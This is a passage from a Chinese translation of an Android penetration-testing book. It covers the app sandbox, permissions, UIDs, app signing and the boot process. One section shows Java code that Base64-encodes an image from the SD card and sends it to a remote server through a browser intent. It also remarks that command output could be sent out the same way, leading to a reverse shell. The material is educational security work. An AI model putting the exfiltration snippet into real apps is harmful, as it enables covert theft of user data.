运行。这就是为什么，无论何时任何应用程序在我们的设备中崩溃，它只是显示强制关闭或
等待选项，但其他应用程序继续顺利运行。此外，由于每个应用程序都在其自己的实例中运
行，因此除非内容提供者另有规定，否则将无法访问其他应用程序的数据。
Android使用细粒度的权限模型，这需要应用程序在编译最终应用程序包之前预定义权限。
你必须注意到，每次从Play商店或任何其他来源下载应用程序时，它会在安装过程中显示一
个权限屏幕，它类似于以下屏幕截图：
第一章Android安全入门
9
此权限屏幕显示应用程序可以通过手机执行的所有任务的列表，例如发送短信，访问互联网
和访问摄像头。请求多于所需的权限使应用程序成为恶意软件作者的更具吸引力的目标。
Android应用程序开发人员必须在开发应用程序时在名为 AndroidManifest.xml的文件中指定
所有这些权限。此文件包含各种应用程序相关信息的列表，例如运行程序所需的最低
Android版本，程序包名称，活动列表（应用程序可见的应用程序中的界面），服务（应用程
序的后台进程），和权限。如果应用程序开发人员未能在 AndroidManifest.xml文件中指定
权限，并仍在应用程序中使用它，则应用程序将崩溃，并在用户运行它时显示强制关闭消
息。
一个正常的 AndroidManifest.xml文件看起来像下面的截图所示。在这里，你可以使
用 标记和其他标记查看所需的不同权限：
如前所述，所有Android应用程序在安装后首次启动时都会分配一个唯一的UID。具有给定
UID的所有用户都属于特定组，具体取决于他们请求的权限。例如，一个仅请求Internet权
限的应用程序将属于 inet组，因为Android中的Internet权限位于 inet组下。
第一章Android安全入门
10
用户（在这种情况下的应用程序）可以属于多个组，具体取决于他们请求的权限。或者换句
话说，每个用户可以属于多个组，并且每个组可以具有多个用户。这些组具有由组
ID（GID）定义的唯一名称。然而，开发人员可以明确地指定其他应用程序在与第一个相同
的UID下运行。在我们的设备中，其中的组和权限在文件 platform.xml中指定，它位
于 /system/etc/permissions/：
shell@grouper:/system/etc/permissions$catplatform.xml
...
...[Someofthedatahasbeenstrippedfromhereinordertoshortentheoutputan
dmakeitreadable]
此外，这清除了对在Android设备中运行的本地应用程序的怀疑。由于本地应用程序直接与
处理器交互，而不是在Dalvik虚拟机下运行，因此它不会以任何方式影响整体安全模型。
现在，就像我们在前面部分看到的，应用程序将其数据存储
在 location/data/data/[packagename]。现在，存储应用程序数据的所有文件夹也具有相同
的用户ID，这构成Android安全模型的基础。根据UID和文件权限，它将限制来自具有不同
UID的其他应用程序对它的访问和修改。
在下面的代码示例中， ret包含以Base64格式编码存储在的SD卡中的图像，现在正在使
用浏览器调用来上传到 attify.com网站。目的只是找到一种方式来在两个不同的Android对
象之间进行通信。
我们将首先创建一个对象来存储图像，在Base64中编码，最后将其存储在一个字符串
中 imageString：
第一章Android安全入门
11
finalFilefile=newFile("/mnt/sdcard/profile.jpg");
Uriuri=Uri.fromFile(file);
ContentResolvercr=getContentResolver();
BitmapbMap=null;
try{
InputStreamis=cr.openInputStream(uri);
bMap=BitmapFactory.decodeStream(is);
if(is!=null){
is.close();
}
}catch(Exceptione){
Log.e("Errorreadingfile",e.toString());
}
ByteArrayOutputStreambaos=newByteArrayOutputStream();
bMap.compress(Bitmap.CompressFormat.JPEG,100,baos);
byte[]b=baos.toByteArray();
StringimageString=Base64.encodeToString(b,Base64.DEFAULT);
最后，我们将启动浏览器将数据发送到我们的服务器，我们有一个 .php文件侦听传入的数
据：
startActivity(newIntent(Intent.ACTION_VIEW,Uri.parse("http://attify.com/up.php?u="+im
ageString)));
我们还可以执行命令并以相同的方式将输出发送到远程服务器。但是，这里需要注意的一点
是shell应该在应用程序的用户下运行：
//Toexecutecommands:
Stringstr="cat/proc/version";//commandtobeexecutedisstoredinstr.
process=Runtime.getRuntime().exec(str);
这是一个有趣的现象，因为攻击者可以获得一个反向shell（这是一个从设备到系统的双向连
接，可以用于执行命令），而不需要任何类型的权限。
1.4应用签名
应用程序签名是Android的独特特性之一，由于其开放性和开发人员社区，它取得了成功。
Play商店中有超过一百万个应用。在Android中，任何人都可以通过下载AndroidSDK创建
Android应用，然后将其发布到Play商店。通常有两种类型的证书签名机制。一个是由管理
证书颁发机构（CA）签名的，另一个是自签名证书。没有中间证书颁发机构（CA），而开
发人员可以创建自己的证书并为应用程序签名。
在Apple的iOS应用程序模型中可以看到CA签名，其中开发者上传到AppStore的每个应
用程序都经过验证，然后由Apple的证书签名。一旦下载到设备，设备将验证应用程序是否
由Apple的CA签名，然后才允许应用程序运行。
第一章Android安全入门
12
但是，在Android中是相反的。没有证书颁发机构;而是开发人员的自创建证书可以签署应用
程序。应用程序上传完成后，会由GoogleBouncer进行验证，这是一个虚拟环境，用于检
查应用程序是否是恶意或合法的。检查完成后，应用就会显示在Play商店中。在这种情况
下，Google不会对该应用程序进行签名。开发人员可以使用AndroidSDK附带的工具（称
为 keytool）创建自己的证书，或者使用Eclipse的GUI创建证书。
因此，在Android中，一旦开发人员使用他创建的证书签名了应用程序，他需要将证书的密
钥保存在安全的位置，以防止其他人窃取他的密钥并使用开发人员的证书签署其他应用程序
。
如果我们有一个Android应用程序（ .apk）文件，我们可以检查应用程序的签名，并找到使
用称为 jarsigner的工具签署应用程序的人，这个工具是AndroidSDK自带的：
$jarsigner-verify-certs-verbosetesting.apk
以下是在应用程序上运行上述命令并获取签名的信息的屏幕截图：
此外，解压缩 .apk文件后，可以解析 META-INF文件夹中出现的 CERT.RSA文件的ASCII内
容，以获取签名，如以下命令所示：
$unziptesting.apk
$cdMETA-INF
$opensslpkcs7-inCERT.RSA-print_certs-informDER-outout.cer
$catout.cer
这在检测和分析未知的Android .apk示例时非常有用。因此，我们可以使用它获得签署人
以及其他详细信息。
1.5Android启动流程
在Android中考虑安全性时最重要的事情之一是Android启动过程。整个引导过程从引导加
载程序开始，它会反过来启动 init过程-第一个用户级进程。
所以，任何引导加载程序的变化，或者如果我们加载另一个，而不是默认存在的引导加载程
序，我们实际上可以更改在设备上加载的内容。引导加载程序通常是特定于供应商的，每个
供应商都有自己的修改版本的引导加载程序。通常，默认情况下，此功能通过锁定引导加载
程序来禁用，它只允许供应商指定的受信任内核在设备上运行。为了将自己的ROM刷到
Android设备，需要解锁引导加载程序。解锁引导加载程序的过程可能因设备而异。在某些
情况下，它也可能使设备的保修失效。
第一章Android安全入门
13
注
在Nexus7中，它就像使用命令行中的 fastboot工具一样简单，如下所示：
$fastbootoemunlock
在其他设备中，可能需要更多精力。我们看看如何创建自己的Bootloader并在本书的后续章
节中使用它。
回到启动过程，在引导加载程序启动内核并启动 init之后，它挂载了Android系统运行所需
的一些重要目录，例如 /dev， /sys和 /proc。此外， init从配置文
件 init.rc和 init.[device-name].rc中获取自己的配置，在某些情况下从位于相同位置
的 .sh文件获取自己的配置。
如果我们对 init.rc文件执行 cat，我们可以看到 init加载自身时使用的所有规范，如下
面的截图所示：
第一章Android安全入门
14
init进程的责任是启动其他必需的组件，例如负责ADB通信和卷守护程序（vold）的adb
守护程序（adbd）。
加载时使用的一些属性位于 build.prop，它位于 location/system。当你在Android设备上
看到Androidlogo时，就完成了 init进程的加载。正如我们在下面的截图中可以看到的，
我们通过检查 build.prop文件来获取设备的具体信息：
一旦所有的东西被加载， init最后会加载一个称为Zygote的进程，负责以最小空间加载
Dalvik虚拟机和共享库，来加快整个进程的加载速度。此外，它继续监听对自己的新调用，
以便在必要时启动更多DVM。这是当你在设备上看到Android开机动画时的情况。
一旦完全启动，Zygote派生自己并启动系统，加载其他必要的Android组件，如活动管理
器。一旦完成整个引导过程，系统发送 BOOT_COMPLETED的广播，许多应用程序可能使用称为
广播接收器的Android应用程序中的组件来监听。当我们在第3章“逆向和审计Android应用
程序”中分析恶意软件和应用程序时，我们将进一步了解广播接收器。
总结
在本章中，我们为学习Android渗透测试建立了基础。我们还了解Android的内部结构及其
安全体系结构。
第一章Android安全入门
15
在接下来的章节中，我们将建立一个Android渗透测试实验室，并使用这些知识执行更多的
技术任务，来渗透Android设备和应用程序。我们还将了解有关ADB的更多信息，并使用它
来收集和分析设备中的信息。
第一章Android安全入门
16
第二章准备实验环境
作者：AdityaGupta
译者：飞龙
协议：CCBY-NC-SA4.0
在上一章中，我们了解了Android安全性及其体系结构的基础知识。在本章中，我们将了解
如何建立Android渗透测试实验环境，其中包括下载和配置AndroidSDK和Eclipse。我们
将深入了解ADB，并了解如何创建和配置Android虚拟设备（AVD）。